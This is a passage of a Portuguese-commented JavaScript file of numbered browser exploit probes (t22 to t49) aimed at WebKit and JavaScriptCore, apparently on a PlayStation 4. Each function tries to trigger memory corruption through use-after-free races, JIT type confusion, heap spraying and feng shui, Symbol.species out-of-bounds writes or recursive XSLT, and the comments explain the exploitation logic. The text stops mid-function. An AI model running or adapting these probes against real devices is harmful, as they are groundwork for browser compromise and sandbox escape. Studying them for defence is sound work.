    // =================================================================
    // 22. SharedBuffer Copy-On-Write Race
    // Alvo: WebKit::NetworkDataTaskCurl::curlDidReceiveData (Usa SharedBuffer)
    // Vulnerabilidade: Race Condition em Buffers Compartilhados.
    // Lógica: 'curlDidReceiveData' passa um 'SharedBuffer' para o WebCore.
    // O Blob API usa esses buffers. Se fizermos 'slice()' (que cria uma referência)
    // e depois enviarmos para um Worker (que tenta serializar/copiar), 
    // podemos ter uma corrida se o buffer original for modificado ou liberado pela rede.
    // =================================================================
    function t22() {
        // Fetch de algo grande para ter múltiplos chunks
        fetch(window.location.href).then(res => res.blob()).then(blob => {
            const slice = blob.slice(0, 1024); // Referência ao SharedBuffer interno
            
            const worker = new Worker(URL.createObjectURL(new Blob([""], {type: 'text/javascript'})));
            
            // AÇÃO: Envia o slice para o worker (clonagem)
            // Simultaneamente, forçamos o descarte do blob original
            worker.postMessage(slice);
            
            // Tenta invalidar o buffer subjacente via pressão de memória
            keeper.push(new ArrayBuffer(1024 * 1024 * 50)); 
            
            log.innerText = "SharedBuffer Slice/Transfer Race iniciada.";
        });
    }

    // =================================================================
    // 23. ResourceStore postTask Queue Flood
    // Alvo: WebKit::WebResourceLoadStatisticsStore::postTask
    // Vulnerabilidade: UAF em Task Queue.
    // Lógica: O método 'postTask' enfileira uma lambda C++ para execução futura.
    // Se inundarmos essa fila com tarefas de navegação e destruirmos o Store,
    // as tarefas pendentes podem tentar executar em um objeto 'this' (Store) morto.
    // =================================================================
    function t23() {
        const frames = [];
        const container = document.createElement('div');
        document.body.appendChild(container);

        // 1. Enfileira muitas tarefas (criação/navegação gera tasks no Store)
        for(let i=0; i<50; i++) {
            const f = document.createElement('iframe');
            container.appendChild(f);
            frames.push(f);
            // Navegação dispara atualização de estatísticas
            f.src = "about:blank?q=" + i; 
        }

        // 2. AÇÃO: Destruição em massa imediata
        // Tenta pegar a fila de tarefas cheia mas não processada
        setTimeout(() => {
            container.remove(); // Remove todos os iframes
            
            // Alocação para sobrescrever a memória da fila de tarefas
            for(let i=0; i<1000; i++) keeper.push(new Uint32Array(256));
            
            log.innerText = "Task Queue inundada e Store destruído.";
        }, 0);
    }

    // =================================================================
    // 24. Network Metrics Performance API Race
    // Alvo: WebKit::NetworkDataTaskCurl::curlDidComplete (Recebe NetworkLoadMetrics)
    // Vulnerabilidade: UAF / Info Leak.
    // Lógica: Quando uma requisição termina, métricas são enviadas para a Performance Timeline.
    // Se abortarmos a requisição no exato momento da conclusão, e lermos a timeline
    // simultaneamente, podemos acessar métricas de um objeto de rede liberado.
    // =================================================================
    function t24() {
        const controller = new AbortController();
        const signal = controller.signal;
        
        fetch(window.location.href + "?race=" + Math.random(), { signal })
            .then(() => {})
            .catch(() => {});

        // Loop de leitura de métricas
        const interval = setInterval(() => {
            const entries = performance.getEntriesByType("resource");
            if(entries.length > 0) {
                // Acessa propriedades para forçar leitura de memória
                const t = entries[entries.length-1].transferSize;
            }
        }, 0);

        // AÇÃO: Aborta em tempo aleatório curto
        setTimeout(() => {
            controller.abort();
            clearInterval(interval);
            
            // Limpa entradas para forçar manipulação da lista interna C++
            performance.clearResourceTimings();
            
            log.innerText = "Race entre Abort e Performance API.";
        }, 5 + Math.random() * 10);
    }

    // =================================================================
    // 25. bmalloc IsoHeap Object Alignment
    // Alvo: bmalloc_IsoHeap (Heap Hardening)
    // Objetivo: Preparação de Heap (Feng Shui).
    // Lógica: Criar um padrão de memória previsível. O IsoHeap isola tipos.
    // Tentamos criar arrays de objetos JS que tenham exatamente o mesmo tamanho
    // de estruturas internas do WebKit (ex: 64 bytes), para facilitar a exploração
    // de um UAF futuro.
    // =================================================================
    function t25() {
        // Estrutura de "Gadget" simulada (Header + 4 pointers = ~48-64 bytes)
        function Gadget() {
            this.a = 0x41414141;
            this.b = 0x42424242;
            this.c = {}; // Pointer
            this.d = {}; // Pointer
        }

        const spray_arr = [];
        
        // 1. Aloca massivamente
        for(let i=0; i<10000; i++) {
            spray_arr.push(new Gadget());
        }
        
        // 2. Cria buracos (Free)
        // Padrão: Aloca 2, Libera 1 (XX_XX_XX)
        for(let i=2; i<spray_arr.length; i+=3) {
            spray_arr[i] = null;
        }
        
        // Agora temos buracos de tamanho específico (64 bytes) no Heap.
        // Se conseguirmos disparar um UAF em um objeto C++ de 64 bytes,
        // ele cairá em um desses buracos controlados por nós.
        
        keeper.push(spray_arr);
        log.innerText = "IsoHeap: Padrão XX_XX_XX (64 bytes) criado.";
    }
// =================================================================
    // 26. Array.sort() JIT Type Confusion
    // Alvo: JavaScriptCore JIT (Presente no ELF)
    // Vulnerabilidade: Type Confusion.
    // Lógica: O JIT otimiza arrays assumindo que o tipo dos elementos é constante (ex: Double).
    // Usamos uma função de comparação customizada no .sort() que altera o tipo do array
    // (de Double para Object) no meio da ordenação. Se o JIT não "desotimizar" (OSRExit)
    // corretamente, ele acessará objetos como se fossem números (ponteiros inválidos).
    // =================================================================
    function t26() {
        const arr = [1.1, 2.2, 3.3];
        // Força otimização do JIT para Array de Doubles
        for(let i=0; i<1000; i++) arr.push(Math.random());

        const evil_comparator = (a, b) => {
            // AÇÃO MALICIOSA: No meio da ordenação, mudamos o array
            // Transformamos o primeiro elemento em um objeto.
            // Isso quebra a suposição do JIT de que "todo o array são números".
            arr[0] = {}; 
            return a - b;
        };

        try {
            log.innerText = "Executando JIT Sort Confusion...";
            arr.sort(evil_comparator);
            
            // Se não crashou, verifica se a memória está corrompida
            // (ex: lendo o ponteiro do objeto como um float)
            if (typeof arr[0] === 'number' && arr[0] < 1) {
                log.innerText = "Possível vazamento de ponteiro!";
            } else {
                log.innerText = "JIT lidou com a mudança de tipo (OSRExit).";
            }
        } catch(e) {
            log.innerText = "Erro durante sort: " + e.message;
        }
    }

    // =================================================================
    // 27. ImageBitmap Transfer/Close Race
    // Alvo: WebCore::SerializedScriptValue (Serialização para Workers)
    // Vulnerabilidade: UAF em Recursos Gráficos.
    // Lógica: ImageBitmap é um recurso acelerado por hardware (GPU).
    // Transferimos o bitmap para um Worker (o que deve esvaziá-lo na thread principal)
    // e chamamos .close() simultaneamente. O WebKit pode tentar liberar a textura GPU duas vezes.
    // =================================================================
    function t27() {
        // Cria um canvas para gerar bitmap
        const c = document.createElement('canvas');
        c.width = 100; c.height = 100;
        
        createImageBitmap(c).then(bmp => {
            const worker = new Worker(URL.createObjectURL(new Blob([""], {type: 'text/javascript'})));
            
            // AÇÃO: Race Condition
            // Transfere a propriedade para o worker
            worker.postMessage(bmp, [bmp]);
            
            // Tenta fechar o recurso localmente no mesmo tick
            try {
                bmp.close();
                log.innerText = "ImageBitmap transferido e fechado.";
            } catch(e) {
                // Se der erro, é porque 'neutering' funcionou.
                // Se passar silenciosamente, perigo de Double-Free.
                log.innerText = "Recurso já estava neutered (Seguro).";
            }
            
            // Spray para sobrescrever textura liberada
            for(let i=0; i<100; i++) keeper.push(new ArrayBuffer(1024 * 1024));
        });
    }

    // =================================================================
    // 28. ServiceWorker Registration in Ephemeral Frame
    // Alvo: WebResourceLoadStatisticsStore (IsEphemeral check no JSON)
    // Vulnerabilidade: Logic Error / Persistência Indevida.
    // Lógica: Frames efêmeros (sandboxed) não deveriam poder registrar ServiceWorkers
    // que persistem no disco. Se conseguirmos registrar e destruir o frame,
    // o gerenciador de SW pode tentar acessar o 'Store' efêmero que já foi destruído.
    // =================================================================
    function t28() {
        if (!navigator.serviceWorker) {
            log.innerText = "ServiceWorker não suportado (Comum no PS4)";
            return;
        }

        const ifr = document.createElement('iframe');
        // Sandbox que permite scripts mas tenta isolar armazenamento
        ifr.sandbox = "allow-scripts allow-same-origin"; 
        document.body.appendChild(ifr);
        
        const doc = ifr.contentDocument;
        const script = doc.createElement('script');
        script.textContent = `
            navigator.serviceWorker.register('sw.js').then(reg => {
                // Tenta forçar escrita no disco
                reg.update();
            }).catch(e => {});
        `;
        
        doc.body.appendChild(script);
        
        // AÇÃO: Destrói o contexto 'efêmero' enquanto o SW está inicializando
        setTimeout(() => {
            ifr.remove();
            
            // Tenta disparar limpeza do Store
            window.location.hash = "cleanup";
            
            log.innerText = "ServiceWorker registration race in Ephemeral context.";
        }, 10);
    }

    // =================================================================
    // 29. Blob URL Navigation & Revoke Race
    // Alvo: DocumentLoader / NetworkDataTaskCurl
    // Vulnerabilidade: UAF no Loader.
    // Lógica: Navegar para uma Blob URL inicia um carregamento interno (ResourceLoader).
    // Revogar a URL remove o mapeamento ID->Dados. Se revogarmos durante o parsing
    // do cabeçalho da resposta (curlDidReceiveResponse), o Loader pode ficar órfão.
    // =================================================================
    function t29() {
        const blob = new Blob(["<html><body>RACE</body></html>"], {type: 'text/html'});
        const url = URL.createObjectURL(blob);
        
        const ifr = document.createElement('iframe');
        document.body.appendChild(ifr);
        
        // Inicia navegação
        ifr.src = url;
        
        // AÇÃO: Revoga imediatamente
        // Tenta acertar o momento exato onde o WebKit verifica a validade da URL
        URL.revokeObjectURL(url);
        
        ifr.onload = () => {
            log.innerText = "Navegação completou (Blob sobreviveu?)";
        };
        
        // Spray para corromper buffers de rede
        keeper.push(new ArrayBuffer(1024 * 512));
        log.innerText = "Blob URL revogada durante navegação.";
    }

    // =================================================================
    // 30. RegExp JIT Sticky Flag Side-Effect
    // Alvo: JavaScriptCore JIT (RegExp Engine)
    // Vulnerabilidade: Side-Effect Modeling.
    // Lógica: A flag 'y' (sticky) em Regex acessa a propriedade 'lastIndex'.
    // Se definirmos 'lastIndex' como um getter com efeitos colaterais (ex: mudar o tipo de uma variável),
    // o JIT pode não prever isso e gerar código de máquina inseguro.
    // =================================================================
    function t30() {
        const re = /a/y;
        
        // Objeto alvo de confusão
        const target = {x: 1};
        
        // Define lastIndex com side-effect
        Object.defineProperty(re, 'lastIndex', {
            get: function() {
                // EFEITO COLATERAL: Muda a forma do objeto 'target'
                // Deleta 'x', transformando a estrutura interna (Shape/Structure)
                delete target.x;
                target.y = 2; 
                return 0;
            }
        });

        // Função para ser compilada pelo JIT
        function jit_me(regex) {
            // O JIT pode assumir que 'target' tem a forma {x: int} aqui
            const val = target.x; 
            regex.exec("a"); // Dispara o getter (e o side-effect)
            return val; // Pode retornar lixo se o JIT não invalidar o código
        }

        // Treina o JIT (Warm-up)
        for(let i=0; i<1000; i++) jit_me(/a/);
        
        // Executa o ataque
        jit_me(re);
        
        log.innerText = "RegExp Sticky Flag Side-Effect testado.";
    }
 // =================================================================
    // 31. FormData Blob Upload vs Revoke
    // Alvo: WebKit::NetworkDataTaskCurl (JSON Ref)
    // Vulnerabilidade: UAF em leitura de arquivo.
    // Lógica: 'FormData' prepara blobs para upload. O cURL lê esses blobs em chunks.
    // Se revogarmos o Blob URL ou forçarmos a coleta do Blob original durante o upload,
    // o cURL pode tentar ler memória liberada.
    // =================================================================
    function t31() {
        const data = new Uint8Array(1024 * 1024 * 10).fill(0x41); // 10MB
        const blob = new Blob([data]);
        const formData = new FormData();
        formData.append("file", blob, "crash.bin");

        const xhr = new XMLHttpRequest();
        xhr.open("POST", "/dummy_upload"); // Não precisa existir

        xhr.upload.onprogress = (e) => {
            // AÇÃO: No meio do upload (quando cURL está lendo)
            if (e.loaded > 1024) {
                // Tenta remover a referência ao blob original
                // Em JS puro não temos 'free', mas removemos referências
                // e alocamos memória nova para forçar reutilização de slot
                
                // Sobrescreve variável (simbólico)
                // O FormData tem referência interna, mas tentamos corromper o BlobDataHandle
                keeper.push(new ArrayBuffer(1024 * 1024 * 10)); 
                
                // Aborta para forçar limpeza de estruturas de rede
                xhr.abort();
                
                log.innerText = "Upload abortado com pressão de memória.";
            }
        };

        xhr.send(formData);
    }

    // =================================================================
    // 32. Rope String Flattening vs GC
    // Alvo: bmalloc (String Heap)
    // Vulnerabilidade: Heap Corruption.
    // Lógica: Strings em JS são "Ropes" (árvores de concatenação) até serem usadas.
    // Criamos uma Rope gigante e forçamos o "flattening" (linearização) via RegExp.
    // Simultaneamente, criamos pressão no GC para tentar mover ou coletar partes da Rope.
    // =================================================================
    function t32() {
        // Cria Rope String (Lazy)
        let s = "A";
        for(let i=0; i<20; i++) s += s; // 1MB string (2^20)
        
        const rope = s + "END"; // Concatenação cria nó Rope
        
        // Define um objeto com toString que dispara GC
        const trigger = {
            toString: () => {
                // Pressão no GC durante a operação de string
                keeper.push(new ArrayBuffer(1024 * 1024));
                return "B";
            }
        };

        try {
            // AÇÃO: replace() força 'flattening' da string.
            // O trigger é chamado durante o processamento.
            // Se o GC rodar e mover a memória da string enquanto ela achata...
            const res = rope.replace(/END/, trigger);
            log.innerText = "Rope Flattening executado.";
        } catch(e) {
            log.innerText = "Erro: " + e.message;
        }
    }

    // =================================================================
    // 33. MessagePort Post vs Iframe Nav
    // Alvo: IPC CompletionHandler (JSON Ref)
    // Vulnerabilidade: Double-Free / UAF.
    // Lógica: Transferimos uma porta para um iframe. Imediatamente navegamos o iframe.
    // O WebKit precisa entregar a mensagem E destruir o contexto do iframe.
    // O handler de "mensagem entregue" pode rodar num contexto destruído.
    // =================================================================
    function t33() {
        const channel = new MessageChannel();
        const ifr = document.createElement('iframe');
        document.body.appendChild(ifr);

        ifr.onload = () => {
            // AÇÃO 1: PostMessage com Transferência
            ifr.contentWindow.postMessage("INIT", "*", [channel.port2]);
            
            // AÇÃO 2: Navegação Imediata (Destrói contexto global)
            // Tenta criar race entre o IPC delivery e o Frame Teardown
            ifr.src = window.location.href + "?kill=" + Math.random();
            
            // Aloca memória para ocupar estruturas de IPC liberadas
            for(let i=0; i<1000; i++) keeper.push(new Uint32Array(128));
            
            log.innerText = "Porta enviada para Iframe em navegação.";
            
            // Limpeza
            setTimeout(() => ifr.remove(), 500);
        };
    }

    // =================================================================
    // 34. ReadableStream Tee Cancel/Read Race
    // Alvo: SharedBuffer (Network/Streams)
    // Vulnerabilidade: UAF em Stream Controller.
    // Lógica: 'tee()' divide um stream em dois. Eles compartilham o buffer subjacente.
    // Cancelar um ramo (branch) enquanto lê o outro pode liberar o buffer prematuramente.
    // =================================================================
    function t34() {
        // Cria stream a partir de Blob
        const blob = new Blob(["STREAM_DATA_TEST_RACE"]);
        const stream = blob.stream();
        
        // Divide em 2
        const [branch1, branch2] = stream.tee();
        
        // Leitor para ramo 1
        const reader1 = branch1.getReader();
        
        // AÇÃO: Cancelamento vs Leitura
        // Cancela ramo 2 (deve sinalizar fechamento para a fonte)
        branch2.cancel("Race Cancel");
        
        // Tenta ler do ramo 1 (que compartilha a fonte)
        reader1.read().then(res => {
            log.innerText = "Leitura bem sucedida após cancelamento (Seguro).";
        }).catch(e => {
            log.innerText = "Erro no stream: " + e.message;
        });
        
        // Spray para corromper controlador de stream
        keeper.push(new ArrayBuffer(1024 * 64));
    }

    // =================================================================
    // 35. Canvas.toBlob() vs Element Removal
    // Alvo: Async IPC Graphics (Callback Hell)
    // Vulnerabilidade: UAF no callback.
    // Lógica: 'toBlob' codifica a imagem em thread separada (ou GPU).
    // Removemos o elemento Canvas do DOM e limpamos referências antes do callback retornar.
    // O callback interno C++ tenta acessar o elemento Canvas original para ler propriedades.
    // =================================================================
    function t35() {
        const c = document.createElement('canvas');
        c.width = 2000; c.height = 2000; // Grande para demorar
        const ctx = c.getContext('2d');
        ctx.fillStyle = 'red';
        ctx.fillRect(0,0,2000,2000);
        
        document.body.appendChild(c);

        // AÇÃO: Inicia codificação assíncrona
        c.toBlob((blob) => {
            log.innerText = "Callback executado (Canvas ainda existe na memória?)";
            // Acessa keeper para garantir que não foi otimizado
            if(keeper.length > 0) log.innerText += " [Memoria ocupada]";
        }, 'image/jpeg', 0.95);

        // Destrói o elemento imediatamente
        document.body.removeChild(c);
        
        // Tenta liberar a referência JS do canvas
        // (Nota: em closure real, 'c' ainda existiria, mas forçamos GC pressure)
        keeper.push(new Float64Array(1024 * 1024 * 10)); // 80MB
        
        log.innerText = "Canvas removido durante toBlob.";
    }
// =================================================================
    // 36. BroadcastChannel Message vs Close Race
    // Alvo: IPC Messaging System (Broadcasting)
    // Vulnerabilidade: UAF em Message Event Dispatch.
    // Lógica: BroadcastChannel envia mensagens para todos os contextos (abas/iframes).
    // Se fecharmos o canal receptor no exato momento em que o evento 'message'
    // está sendo despachado, o WebKit pode tentar acessar um contexto morto.
    // =================================================================
    function t36() {
        const name = "race_channel_" + Math.random();
        const sender = new BroadcastChannel(name);
        const receiver = new BroadcastChannel(name);
        
        receiver.onmessage = (e) => {
            // AÇÃO: Fecha o receptor durante o processamento
            receiver.close();
            
            // Tenta forçar GC imediato
            keeper.push(new ArrayBuffer(1024 * 1024));
            
            log.innerText = "Receiver fechado durante onmessage.";
        };

        // Envia mensagem complexa (Buffer transferível se suportado, ou objeto grande)
        sender.postMessage({data: new Array(1000).fill(1.1)});
        
        // Limpa sender depois
        setTimeout(() => sender.close(), 100);
    }

    // =================================================================
    // 37. TypedArray Species Constructor Hijack
    // Alvo: JavaScriptCore (JSC)
    // Vulnerabilidade: Out-of-Bounds Read/Write.
    // Lógica: Métodos como .filter() ou .map() em TypedArrays usam o construtor da classe
    // para criar o array de resultado. Se sequestrarmos esse construtor (Symbol.species)
    // para retornar um array menor do que o esperado, o loop interno do JSC pode
    // escrever fora dos limites do novo buffer.
    // =================================================================
    function t37() {
        class EvilArray extends Uint8Array {
            static get [Symbol.species]() {
                return function() {
                    // Retorna um array minúsculo quando o motor espera um do mesmo tamanho
                    return new Uint8Array(1); 
                }
            }
        }

        const input = new EvilArray(1000); // Array original tamanho 1000
        input.fill(0x41);

        try {
            // .map() espera criar outro array de tamanho 1000.
            // Mas nosso 'species' retorna um de tamanho 1.
            // Se o JSC não verificar os limites a cada iteração, ele escreve 999 bytes no heap.
            const res = input.map(x => x + 1);
            
            log.innerText = "Species Hijack executado (Verificar crash/heap).";
        } catch(e) {
            log.innerText = "JSC mitigou o ataque: " + e.message;
        }
    }

    // =================================================================
    // 38. XSLT Recursion Memory Corruption
    // Alvo: WebCore::XSLTProcessor (Libxslt)
    // Vulnerabilidade: Stack Overflow / Memory Corruption.
    // Lógica: Criamos uma folha de estilo XSLT que chama a si mesma recursivamente
    // ou aplica templates em loop infinito. Motores antigos podem crashar corrompendo
    // a memória ao invés de lançar erro de "Too much recursion".
    // =================================================================
    function t38() {
        const xml = new DOMParser().parseFromString("<root></root>", "text/xml");
        const xsl = new DOMParser().parseFromString(`
            <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
                <xsl:template match="/">
                    <xsl:call-template name="bomb"/>
                </xsl:template>
                <xsl:template name="bomb">
                    <data>A</data>
                    <xsl:call-template name="bomb"/> </xsl:template>
            </xsl:stylesheet>
        `, "text/xml");

        const processor = new XSLTProcessor();
        processor.importStylesheet(xsl);

        try {
            log.innerText = "Iniciando XSLT Recursivo...";
            // Isso deve estourar a pilha ou o alocador de nós
            processor.transformToFragment(xml, document);
        } catch(e) {
            log.innerText = "Erro capturado: " + e.message;
        }
    }

    // =================================================================
    // 39. WebGL Video Texture Race
    // Alvo: libSceGnm (GPU) <-> libSceAvPlayer (Video)
    // Vulnerabilidade: UAF de Textura.
    // Lógica: Carregamos um vídeo como textura WebGL (`texImage2D`).
    // No momento do upload (que é pesado), limpamos a fonte do vídeo.
    // O driver gráfico pode tentar ler frames de um decodificador destruído.
    // =================================================================
    function t39() {
        const v = document.createElement('video');
        v.src = window.location.href; // Fonte inválida ou blob, o importante é ter o objeto
        
        const c = document.createElement('canvas');
        const gl = c.getContext('webgl');
        const tex = gl.createTexture();
        
        gl.bindTexture(gl.TEXTURE_2D, tex);

        // AÇÃO: Upload de textura
        try {
            // Tenta upload
            gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, gl.RGBA, gl.UNSIGNED_BYTE, v);
            
            // Destruição imediata da fonte
            v.src = "";
            v.remove();
            
            // Desenho imediato
            gl.drawArrays(gl.TRIANGLES, 0, 3);
            
            log.innerText = "Video Texture Upload Race executado.";
        } catch(e) {
            // Esperado que falhe em src inválido, mas o crash ocorre no driver
        }
        
        keeper.push(new Uint32Array(1024*1024));
    }

    // =================================================================
    // 40. JSON.parse Reviver Buffer Detach
    // Alvo: JavaScriptCore (JSON Parser)
    // Vulnerabilidade: UAF / Type Confusion.
    // Lógica: `JSON.parse` aceita uma função 'reviver'. Essa função roda para cada chave.
    // Se dentro do 'reviver' nós "detacharmos" (neutering) o buffer onde o JSON
    // está sendo construído ou referenciado, o parser pode escrever em memória morta.
    // =================================================================
    function t40() {
        const buffer = new ArrayBuffer(1024 * 1024);
        const worker = new Worker(URL.createObjectURL(new Blob([""], {type:'text/javascript'})));
        
        // JSON gigante para dar tempo
        const jsonStr = '{"a": 1, "b": 2, "c": [1,2,3], "d": "DETACH_ME"}';
        
        try {
            JSON.parse(jsonStr, (key, value) => {
                if (value === "DETACH_ME") {
                    // AÇÃO DESTRUTIVA
                    // Transfere o buffer global para o worker, esvaziando-o aqui
                    worker.postMessage(buffer, [buffer]);
                    
                    // Aloca lixo no lugar
                    keeper.push(new ArrayBuffer(1024 * 1024));
                    
                    log.innerText = "Buffer detached dentro do JSON Reviver.";
                }
                return value;
            });
        } catch(e) {
            log.innerText = "JSON parse falhou: " + e.message;
        }
    }
// =================================================================
    // 41. SharedWorker Session Race
    // Alvo: WebResourceLoadStatisticsStore (Session Management)
    // Vulnerabilidade: UAF em Processo Compartilhado.
    // Lógica: SharedWorkers vivem em um processo separado ou thread global.
    // Registrar um em um iframe efêmero e destruir o iframe tenta limpar a sessão.
    // Se o SharedWorker ainda estiver inicializando, o gerenciador de recursos pode falhar.
    // =================================================================
    function t41() {
        if (!window.SharedWorker) {
            log.innerText = "SharedWorker não suportado (Seguro).";
            return;
        }

        const ifr = document.createElement('iframe');
        document.body.appendChild(ifr);
        
        try {
            // Cria script para o worker
            const blob = new Blob(["onconnect = function(e) {}"], {type: 'application/javascript'});
            const url = URL.createObjectURL(blob);
            
            // Inicia Worker no contexto do iframe
            new ifr.contentWindow.SharedWorker(url, "RaceWorker");
            
            // AÇÃO: Destruição imediata
            // Tenta causar race no IPC que registra o worker
            setTimeout(() => {
                ifr.remove();
                URL.revokeObjectURL(url);
                
                // Spray para corromper a tabela de processos workers
                for(let i=0; i<1000; i++) keeper.push(new ArrayBuffer(256));
                
                log.innerText = "SharedWorker iniciado e contexto morto.";
            }, 0);
        } catch(e) {
            log.innerText = "Erro: " + e.message;
        }
    }

    // =================================================================
    // 42. Intl.DateTimeFormat Getter Side-Effect
    // Alvo: JavaScriptCore Runtime (Library Calls)
    // Vulnerabilidade: UAF Interno.
    // Lógica: O formatador de data lê propriedades do objeto Date.
    // Definimos um getter malicioso que, quando lido pelo C++, limpa a referência
    // ao objeto original, tentando liberar sua memória enquanto a lib de formatação (ICU) a usa.
    // =================================================================
    function t42() {
        const formatter = new Intl.DateTimeFormat('en-US', {
            timeZone: 'UTC',
            weekday: 'long'
        });

        const evilDate = new Date();
        
        // Sobrescreve 'toString' ou 'toISOString' que o formatador pode chamar
        // Ou melhor, um getter de propriedade se o motor tentar converter
        Object.defineProperty(evilDate, Symbol.toPrimitive, {
            get: function() {
                // AÇÃO: Side-effect destrutivo
                // Tenta forçar GC e limpar referências
                keeper = []; // Limpa referências globais
                const junk = new ArrayBuffer(1024 * 1024 * 10); // Pressão
                return "default";
            }
        });

        try {
            log.innerText = "Formatando data maliciosa...";
            formatter.format(evilDate);
            log.innerText = "Formatador sobreviveu.";
        } catch(e) {
            log.innerText = "Crash evitado: " + e.message;
        }
    }

    // =================================================================
    // 43. decodeAudioData ArrayBuffer Detach
    // Alvo: libSceAvPlayer / Audio DSP
    // Vulnerabilidade: Buffer Overflow / UAF.
    // Lógica: `decodeAudioData` processa o buffer assincronamente.
    // Se usarmos um Worker para "transferir" (neuter) o ArrayBuffer enquanto
    // o DSP está lendo, o ponteiro de áudio pode ler lixo ou causar crash.
    // =================================================================
    function t43() {
        const ctx = new (window.AudioContext || window.webkitAudioContext)();
        const buffer = new ArrayBuffer(1024 * 1024); // 1MB silêncio
        const worker = new Worker(URL.createObjectURL(new Blob([""], {type: 'text/javascript'})));

        // Inicia decodificação
        const p = ctx.decodeAudioData(buffer).catch(e => {});

        // AÇÃO: Race Condition - Detach Buffer
        // Tenta transferir a posse do buffer para o worker IMEDIATAMENTE
        try {
            worker.postMessage(buffer, [buffer]);
            
            // Se o buffer foi transferido, byteLength vira 0
            if (buffer.byteLength === 0) {
                log.innerText = "Buffer esvaziado durante decodeAudioData.";
            }
        } catch(e) {}
        
        // Spray no heap de áudio
        keeper.push(new Float32Array(100000));
    }

    // =================================================================
    // 44. DOMParser Stream vs Fetch Abort
    // Alvo: WebKit::NetworkDataTaskCurl (JSON Ref)
    // Vulnerabilidade: UAF no Parser XML.
    // Lógica: Usamos `DOMParser` para parsear um stream vindo de um fetch.
    // Abortamos o fetch no meio do parsing. O parser pode tentar ler mais dados
    // de uma tarefa de rede cancelada.
    // =================================================================
    function t44() {
        const controller = new AbortController();
        const parser = new DOMParser();
        
        fetch(window.location.href, { signal: controller.signal })
            .then(res => res.text())
            .then(text => {
                // Simula stream chunked chamando parse repetidamente ou parseando string gigante
                // Mas para Race, vamos abortar ANTES do parse terminar (se fosse stream real)
                
                // Em JS síncrono é difícil, então usamos setTimeout para agendar o abort
                // logo após iniciar uma operação pesada
                setTimeout(() => controller.abort(), 0);
                
                const doc = parser.parseFromString(text.repeat(1000), "text/xml");
                log.innerText = "Parse completou (Race failed).";
            })
            .catch(e => {
                log.innerText = "Fetch abortado.";
            });
            
        keeper.push(new Uint8Array(1024*1024));
    }

    // =================================================================
    // 45. History pushState Cyclic Object Crash
    // Alvo: SerializedScriptValue (Serializador de Histórico)
    // Vulnerabilidade: Stack Overflow / Memory Corruption.
    // Lógica: O WebKit serializa o objeto de estado ao navegar.
    // Criamos um objeto cíclico (A aponta para B, B aponta para A) e tentamos salvar.
    // Motores antigos crashavam a stack; motores novos devem lançar erro.
    // Se houver bug na detecção de ciclo, corrompe memória.
    // =================================================================
    function t45() {
        const a = {};
        const b = { parent: a };
        a.child = b;
        
        // Cria ciclo profundo
        let curr = a;
        for(let i=0; i<100; i++) {
            curr.next = { prev: curr };
            curr = curr.next;
        }
        curr.cycle = a; // Fecha o ciclo

        try {
            log.innerText = "Tentando serializar ciclo no History...";
            history.pushState(a, "crash");
            log.innerText = "Browser detectou o ciclo (Seguro).";
        } catch(e) {
            // Se for erro de "DataCloneError", é seguro.
            // Se o navegador sumir, funcionou.
            log.innerText = "Erro capturado: " + e.message;
        }
    }
// =================================================================
    // 46. XHR Blob Fetch vs Revoke
    // Alvo: WebKit::NetworkDataTaskCurl (JSON Ref)
    // Vulnerabilidade: UAF no BlobRegistry.
    // Lógica: Criamos uma Blob URL e iniciamos um XHR para baixá-la (loopback).
    // Revogamos a URL imediatamente. O backend cURL tenta resolver o UUID do Blob
    // que acabou de ser invalidado.
    // =================================================================
    function t46() {
        const blob = new Blob(["A".repeat(1024)], {type: 'text/plain'});
        const url = URL.createObjectURL(blob);
        
        const xhr = new XMLHttpRequest();
        xhr.open("GET", url);
        xhr.responseType = "blob";
        
        xhr.onreadystatechange = () => {
            // AÇÃO: Revoga no estado HEADERS_RECEIVED (antes do corpo completo)
            if (xhr.readyState === 2) {
                URL.revokeObjectURL(url);
                
                // Força limpeza do Blob original
                keeper.push(new ArrayBuffer(1024 * 1024));
                log.innerText = "Blob URL revogada durante XHR Fetch.";
            }
        };
        
        xhr.send();
    }

    // =================================================================
    // 47. Worker Termination Port UAF
    // Alvo: CompletionHandler (IPC)
    // Vulnerabilidade: Double-Free.
    // Lógica: Enviamos uma MessagePort para um Worker. Imediatamente matamos o Worker.
    // O WebKit precisa limpar a fila de mensagens do Worker morto. O destrutor da
    // MessagePort pode ser chamado duas vezes (uma pelo GC do Worker, outra pela falha de entrega).
    // =================================================================
    function t47() {
        const channel = new MessageChannel();
        const worker = new Worker(URL.createObjectURL(new Blob([""], {type: 'text/javascript'})));
        
        // AÇÃO 1: Envia porta (Transfere ownership)
        worker.postMessage("PING", [channel.port2]);
        
        // AÇÃO 2: Mata o processo destino imediatamente
        worker.terminate();
        
        // Tenta fechar o lado local para confundir o estado do par
        try {
            channel.port1.close();
        } catch(e) {}
        
        // Spray para ocupar memória de portas liberadas
        for(let i=0; i<1000; i++) keeper.push(new ArrayBuffer(128));
        
        log.innerText = "Porta enviada para Worker terminado.";
    }

    // =================================================================
    // 48. FontFace Network Race
    // Alvo: libSceFont / NetworkDataTaskCurl
    // Vulnerabilidade: UAF no Carregador de Fontes.
    // Lógica: Iniciamos o carregamento de uma fonte via rede (cURL).
    // Antes do download terminar, removemos a fonte do documento (`document.fonts.delete`).
    // O callback de rede pode tentar escrever dados de fonte em um objeto `FontFace` destruído.
    // =================================================================
    function t48() {
        // URL única para evitar cache e forçar rede
        const fontUrl = window.location.href + "?font=" + Math.random();
        const face = new FontFace("CrashFont", `url(${fontUrl})`);
        
        document.fonts.add(face);
        
        // Inicia load
        face.load().catch(() => {}); // Ignora erro de rede (esperado)
        
        // AÇÃO: Race Condition
        // Remove a fonte do Set global enquanto 'load()' está pendente
        setTimeout(() => {
            document.fonts.delete(face);
            
            // Sobrescreve memória
            keeper.push(new Uint32Array(1024 * 10));
            
            log.innerText = "FontFace deletada durante carregamento de rede.";
        }, 5);
    }

    // =================================================================
    // 49. ReadableStream Lock vs GetReader
    // Alvo: WebCore::ReadableStream
    // Vulnerabilidade: Logic Error / State Corruption.
    // Lógica: Um stream só pode ter um leitor (Lock). Tentamos obter um leitor,
    // e no mesmo ciclo de execução, tentar transferir ou ler de novo, explorando
    // a latência de atualização do estado "locked".
    // =================================================================
    function t49() {
        const stream = new ReadableStream({
            start(controller) {
                controller.enqueue("chunk");
                controller.close();
            }
        });
        
        try {
